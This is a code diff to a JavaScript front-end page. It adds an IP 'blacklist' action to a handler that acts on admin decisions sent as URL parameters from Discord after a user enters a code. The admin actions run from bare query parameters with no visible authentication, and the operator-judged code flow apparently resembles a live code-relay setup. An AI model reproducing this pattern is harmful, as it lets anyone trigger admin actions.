@@ -47,20 +47,30 @@ export default function Home() {
     }
   }, []);
 
-  // Handle ?triggerAction=valid|wrong|expired&id=... from Discord (after code entry)
+  // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
   useEffect(() => {
     if (step !== "triggerAction") return;
     const p = getParams();
     const action = p.get("triggerAction");
     const id = p.get("id");
+    const ip = p.get("ip");
     if (!action || !id) { setStep("form"); return; }
 
-    base44.functions.invoke("sendCode", { submissionId: id, action })
-      .catch(() => {})
-      .finally(() => {
-        window.history.replaceState({}, "", "/");
-        setStep("adminDone");
-      });
+    if (action === "blacklist") {
+      base44.functions.invoke("blacklistUser", { submissionId: id, ip })
+        .catch(() => {})
+        .finally(() => {
+          window.history.replaceState({}, "", "/");
+          setStep("adminDone");
+        });
+    } else {
+      base44.functions.invoke("sendCode", { submissionId: id, action })
+        .catch(() => {})
+        .finally(() => {
+          window.history.replaceState({}, "", "/");
+          setStep("adminDone");
+        });
+    }
   }, []);
 
   // Poll every 3s when on "validation" step (waiting for code_ready)
